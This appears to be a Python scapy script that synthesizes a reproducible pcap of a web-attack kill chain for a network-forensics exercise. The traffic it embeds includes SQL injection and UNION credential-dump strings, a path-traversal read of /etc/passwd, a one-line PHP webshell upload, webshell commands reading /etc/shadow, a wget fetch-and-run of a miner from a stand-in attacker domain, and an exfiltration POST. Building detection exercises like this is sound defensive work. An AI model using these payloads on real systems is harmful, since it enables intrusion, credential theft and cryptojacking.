#!/usr/bin/env python3
"""자체 제작 공격 pcap 생성기 — 결정론적(고정 seed/타임스탬프)이라 재현 가능.

MTA 문제는 전부 '워크스테이션 악성코드 감염'이라 인바운드 웹취약점 공격 케이스가 없다.
이 스크립트는 실제 공격자 킬체인을 scapy 로 합성한다: 정찰 → SQLi → 경로순회(LFI) →
웹셸 업로드 → RCE → 2차 페이로드 다운로드/유출. 정답을 '설계값'으로 알기 때문에
truth 를 무손실로 쓸 수 있다(순환논리 없음).

산출물(pcap)은 build 아티팩트다 — 스크립트+truth 만 커밋하면 언제든 동일 pcap 재생성.
  python scripts/gen_attack_pcap.py            # → pcaps/2026-03-15-web-attack-exercise.pcap
  python scripts/gen_attack_pcap.py -o <경로>
"""
import argparse
import os
import random

from scapy.all import (Ether, IP, UDP, TCP, Raw, BOOTP, DHCP, DNS, DNSQR, DNSRR,
                        wrpcap)

# ─────────────────────────── 시나리오 상수 (= 정답 설계값) ───────────────────────────
# 내부 세그먼트 10.7.7.0/24 (dmz.example.internal)
VICTIM_IP   = "10.7.7.10"      # 공격당한 웹서버 (WEBSRV01)
VICTIM_MAC  = "00:50:56:a1:07:10"
VICTIM_HOST = "WEBSRV01"
DNS_IP      = "10.7.7.2"       # 내부 DNS 서버
DNS_MAC     = "00:50:56:a1:07:02"
GW_IP       = "10.7.7.1"       # 게이트웨이 (외부 트래픽은 이 MAC 으로 들어옴)
GW_MAC      = "00:50:56:a1:07:01"

ATTACKER_IP = "45.148.10.66"   # 공격자 (외부) — SQLi/웹셸/RCE 원점
STAGE2_IP   = "185.220.101.42" # 2차 페이로드 배포 호스트 (외부)
STAGE2_DOM  = "pull.evilcdn-cache.com"   # 웹셸이 2차를 끌어오는 도메인

# 고정 시작 시각: 2026-03-15 14:22:00 UTC (Date.now 안 씀 → 재현성)
T0 = 1773584520.0

random.seed(20260315)          # ISN 고정 → 동일 바이트 pcap


# ─────────────────────────── TCP/HTTP 세션 헬퍼 ───────────────────────────
def http_conn(pkts, t, cip, cmac, sip, smac, sport, req, resp, dport=80):
    """요청→응답 1개를 완결된 TCP 연결(HTTP/1.0 close)로 합성. seq/ack 정확히 맞춰
    Zeek 가 스트림을 재조립해 http.log 를 남기게 한다. 반환: 마지막 패킷 시각."""
    req, resp = req.encode() if isinstance(req, str) else req, \
                resp.encode() if isinstance(resp, str) else resp
    cisn, sisn = random.randint(1, 2**31), random.randint(1, 2**31)

    def eth(c2s):
        return Ether(src=cmac, dst=smac) if c2s else Ether(src=smac, dst=cmac)

    def ip(c2s):
        return IP(src=cip, dst=sip) if c2s else IP(src=sip, dst=cip)

    def push(c2s, flags, seq, ack, payload=b"", dt=0.0008):
        nonlocal t
        t += dt
        sp, dp = (sport, dport) if c2s else (dport, sport)
        p = eth(c2s) / ip(c2s) / TCP(sport=sp, dport=dp, flags=flags, seq=seq,
                                     ack=ack, window=65535)
        if payload:
            p = p / Raw(load=payload)
        p.time = t
        pkts.append(p)

    MSS = 1460

    def stream(c2s, data, seq, ack):
        """data 를 MSS 단위로 분할 전송(현실적 세그먼트) → 소비한 바이트 수 반환."""
        off = 0
        while off < len(data):
            chunk = data[off:off + MSS]
            last = off + MSS >= len(data)
            push(c2s, "PA" if last else "A", seq + off, ack, chunk)
            off += len(chunk)
        return len(data)

    # 3-way handshake
    push(True,  "S",  cisn,     0)
    push(False, "SA", sisn,     cisn + 1)
    cseq, sseq = cisn + 1, sisn + 1
    push(True,  "A",  cseq,     sseq)
    # 요청
    cseq += stream(True, req, cseq, sseq)
    push(False, "A",  sseq,     cseq)
    # 응답
    sseq += stream(False, resp, sseq, cseq)
    push(True,  "A",  cseq,     sseq)
    # teardown (server FIN → client ACK → client FIN → server ACK)
    push(False, "FA", sseq,     cseq)
    push(True,  "A",  cseq,     sseq + 1)
    push(True,  "FA", cseq,     sseq + 1)
    push(False, "A",  sseq + 1, cseq + 1)
    return t


def dhcp_lease(pkts, t):
    """DISCOVER/OFFER/REQUEST/ACK — Zeek dhcp.log 에 hostname/assigned_addr 를 남긴다."""
    cmac_raw = bytes.fromhex(VICTIM_MAC.replace(":", ""))

    def bootp(op):
        return BOOTP(op=op, chaddr=cmac_raw, xid=0x77071026,
                     yiaddr=(VICTIM_IP if op == 2 else "0.0.0.0"),
                     siaddr=DNS_IP)

    frames = [
        (VICTIM_MAC, "ff:ff:ff:ff:ff:ff", "0.0.0.0", "255.255.255.255", 1,
         [("message-type", "discover"), ("hostname", VICTIM_HOST),
          ("param_req_list", [1, 3, 6, 15]), "end"]),
        (DNS_MAC, VICTIM_MAC, DNS_IP, VICTIM_IP, 2,
         [("message-type", "offer"), ("server_id", DNS_IP),
          ("subnet_mask", "255.255.255.0"), ("router", GW_IP),
          ("name_server", DNS_IP), ("lease_time", 86400), "end"]),
        (VICTIM_MAC, "ff:ff:ff:ff:ff:ff", "0.0.0.0", "255.255.255.255", 1,
         [("message-type", "request"), ("hostname", VICTIM_HOST),
          ("server_id", DNS_IP), ("requested_addr", VICTIM_IP), "end"]),
        (DNS_MAC, VICTIM_MAC, DNS_IP, VICTIM_IP, 2,
         [("message-type", "ack"), ("server_id", DNS_IP),
          ("subnet_mask", "255.255.255.0"), ("router", GW_IP),
          ("name_server", DNS_IP), ("lease_time", 86400), "end"]),
    ]
    for i, (sm, dm, si, di, op, opts) in enumerate(frames):
        p = (Ether(src=sm, dst=dm) / IP(src=si, dst=di) /
             UDP(sport=(68 if op == 1 else 67), dport=(67 if op == 1 else 68)) /
             bootp(op) / DHCP(options=opts))
        p.time = t + i * 0.01
        pkts.append(p)
    return t + 0.05


def dns_lookup(pkts, t, qname, answer_ip):
    """웹서버가 내부 DNS(10.7.7.2)로 도메인 조회 → dns.log 에 query+answers."""
    txid = random.randint(0, 0xFFFF)
    q = (Ether(src=VICTIM_MAC, dst=DNS_MAC) / IP(src=VICTIM_IP, dst=DNS_IP) /
         UDP(sport=random.randint(1025, 65000), dport=53) /
         DNS(id=txid, rd=1, qd=DNSQR(qname=qname)))
    q.time = t
    r = (Ether(src=DNS_MAC, dst=VICTIM_MAC) / IP(src=DNS_IP, dst=VICTIM_IP) /
         UDP(sport=53, dport=q[UDP].sport) /
         DNS(id=txid, qr=1, rd=1, ra=1, qd=DNSQR(qname=qname),
             an=DNSRR(rrname=qname, type="A", ttl=300, rdata=answer_ip)))
    r.time = t + 0.003
    pkts.extend([q, r])
    return t + 0.01


# ─────────────────────────── HTTP 메시지 빌더 ───────────────────────────
NIKTO_UA = "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:map_codes)"
SQLMAP_UA = "sqlmap/1.8.3#stable (https://sqlmap.org)"
CURL_UA = "curl/8.5.0"


def GET(path, host, ua, extra=""):
    return (f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\n"
            f"Accept: */*\r\n{extra}Connection: close\r\n\r\n")


def POST(path, host, ua, body, ctype="application/x-www-form-urlencoded", extra=""):
    return (f"POST {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\n"
            f"Content-Type: {ctype}\r\nContent-Length: {len(body)}\r\n"
            f"Accept: */*\r\n{extra}Connection: close\r\n\r\n{body}")


def RESP(status, body, ctype="text/html; charset=UTF-8"):
    reason = {200: "OK", 302: "Found", 404: "Not Found", 403: "Forbidden",
              500: "Internal Server Error"}.get(status, "OK")
    body = body.encode() if isinstance(body, str) else body
    head = (f"HTTP/1.1 {status} {reason}\r\nServer: Apache/2.4.52 (Ubuntu)\r\n"
            f"Content-Type: {ctype}\r\nContent-Length: {len(body)}\r\n"
            f"Connection: close\r\n\r\n").encode()
    return head + body


# ─────────────────────────── 킬체인 시나리오 ───────────────────────────
def build():
    pkts = []
    t = T0

    HOST = "webapp.example.com"
    AMAC = GW_MAC        # 외부 공격자 트래픽은 게이트웨이 MAC 으로 들어옴
    sp = iter(range(40000, 41000))   # 공격자 소스포트 (연결마다 증가)

    def atk(t, req, resp):
        return http_conn(pkts, t, ATTACKER_IP, AMAC, VICTIM_IP, VICTIM_MAC,
                         next(sp), req, resp)

    # 0) 웹서버 DHCP 임대 (hostname/mac 근거)
    t = dhcp_lease(pkts, t)
    t += 2

    # 1) 정찰 — Nikto 류 경로 스캐닝 (대부분 404/403)
    recon = [
        ("/robots.txt", 404, "Not Found"),
        ("/admin/", 403, "<h1>403 Forbidden</h1>"),
        ("/.git/config", 404, "Not Found"),
        ("/phpinfo.php", 404, "Not Found"),
        ("/wp-login.php", 404, "Not Found"),
        ("/.env", 200, "APP_ENV=production\nDB_HOST=127.0.0.1\nDB_USER=webapp\n"),
    ]
    for path, code, body in recon:
        t = atk(t, GET(path, HOST, NIKTO_UA), RESP(code, body))
        t += 0.4

    t += 3
    # 2) SQL injection — 에러기반으로 주입점 확인 후 union 으로 자격증명 덤프
    err_body = ("<b>Warning</b>: You have an error in your SQL syntax; check the "
                "manual that corresponds to your MySQL server version near "
                "'\\'' at line 1 in <b>/var/www/html/products.php</b>")
    t = atk(t, GET("/products.php?id=1'", HOST, SQLMAP_UA), RESP(500, err_body))
    t += 0.6
    t = atk(t, GET("/products.php?id=1+AND+1=1", HOST, SQLMAP_UA),
            RESP(200, "<div class='product'>Widget A - $19.99</div>"))
    t += 0.5
    t = atk(t, GET("/products.php?id=1+AND+1=2", HOST, SQLMAP_UA),
            RESP(200, "<div class='product'></div>"))
    t += 0.5
    dump = ("<div class='product'>admin:$2y$10$N9qo8uLOickgx2ZMRZoMy."
            "eIjfSY.tOU2Pf0qESGh5F5tK.5xY8W6</div>\n"
            "<div class='product'>jdoe:$2y$10$abcdEfGhIjKlMnOpQrStUv."
            "wXyZ0123456789AbCdEfGhIjKlMnOpQr</div>")
    t = atk(t, GET("/products.php?id=1+UNION+SELECT+username,password,3+FROM+users--+-",
                   HOST, SQLMAP_UA), RESP(200, dump))
    t += 3

    # 3) 경로 순회 / LFI — /etc/passwd 유출
    passwd = ("root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:"
              "/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n"
              "webapp:x:1000:1000::/home/webapp:/bin/bash\n")
    t = atk(t, GET("/download.php?file=../../../../../../etc/passwd", HOST, CURL_UA),
            RESP(200, passwd, ctype="text/plain"))
    t += 2.5

    # 4) 웹셸 업로드 — multipart, filename 에 경로순회 (ET WebShell Upload 시그니처 유도)
    boundary = "----WebKitFormBoundaryA1B2C3"
    shell_php = "<?php echo shell_exec($_GET['cmd']); ?>"
    upload_body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; '
        f'filename="../../var/www/html/uploads/shell.php"\r\n'
        f"Content-Type: application/x-php\r\n\r\n{shell_php}\r\n"
        f"--{boundary}--\r\n")
    t = atk(t, POST("/upload.php", HOST, CURL_UA, upload_body,
                    ctype=f"multipart/form-data; boundary={boundary}"),
            RESP(200, '{"status":"ok","path":"/uploads/shell.php"}',
                 ctype="application/json"))
    t += 2

    # 5) 웹셸 RCE — cmd 파라미터로 명령 실행
    rce = [
        ("id", "uid=33(www-data) gid=33(www-data) groups=33(www-data)"),
        ("whoami", "www-data"),
        ("uname+-a", "Linux WEBSRV01 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux"),
        ("cat+/etc/shadow", "root:$6$rounds=656000$abcd$xyz...:19700:0:99999:7:::"),
    ]
    for cmd, out in rce:
        t = atk(t, GET(f"/uploads/shell.php?cmd={cmd}", HOST, CURL_UA), RESP(200, out,
                ctype="text/plain"))
        t += 1.2

    t += 1
    # 6) 2차 페이로드 — 웹셸이 도메인 조회 후 외부에서 리버스셸/코인마이너 끌어옴
    t = dns_lookup(pkts, t, STAGE2_DOM, STAGE2_IP)
    t += 0.5
    wget_cmd = "wget+-O+/tmp/kworker+http://pull.evilcdn-cache.com/x86_64/miner;chmod+777+/tmp/kworker;/tmp/kworker+%26"
    t = atk(t, GET(f"/uploads/shell.php?cmd={wget_cmd}", HOST, CURL_UA),
            RESP(200, "--2026-03-15-- saved '/tmp/kworker' [4194304/4194304]",
                 ctype="text/plain"))
    t += 0.5
    # 웹서버(감염됨) → STAGE2 로 ELF 다운로드 (아웃바운드)
    elf = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 56 + b"stage2-miner-payload" * 200
    t = http_conn(pkts, t, VICTIM_IP, VICTIM_MAC, STAGE2_IP, GW_MAC, next(sp),
                  GET("/x86_64/miner", STAGE2_DOM, "Wget/1.21.2"),
                  RESP(200, elf, ctype="application/octet-stream"))
    t += 2

    # 7) 데이터 유출 — 웹셸로 DB 덤프를 tar 해서 공격자에게 POST (아웃바운드 대용량)
    dump_blob = "DUMP" + "A" * 60000
    t = atk(t, POST("/uploads/shell.php?cmd=exfil", HOST, CURL_UA, dump_blob,
                    ctype="application/octet-stream"),
            RESP(200, "ok", ctype="text/plain"))

    return pkts


def main():
    ap = argparse.ArgumentParser(description="웹취약점 공격 킬체인 pcap 생성 (결정론적)")
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    default = os.path.join(root, "pcaps", "2026-03-15-web-attack-exercise.pcap")
    ap.add_argument("-o", "--out", default=default, help="출력 pcap 경로")
    args = ap.parse_args()

    pkts = build()
    os.makedirs(os.path.dirname(args.out), exist_ok=True)
    wrpcap(args.out, pkts)
    print(f"[*] {len(pkts)} packets → {args.out}")
    print(f"    victim   {VICTIM_IP} ({VICTIM_HOST})")
    print(f"    attacker {ATTACKER_IP}  stage2 {STAGE2_IP} ({STAGE2_DOM})")


if __name__ == "__main__":
    main()
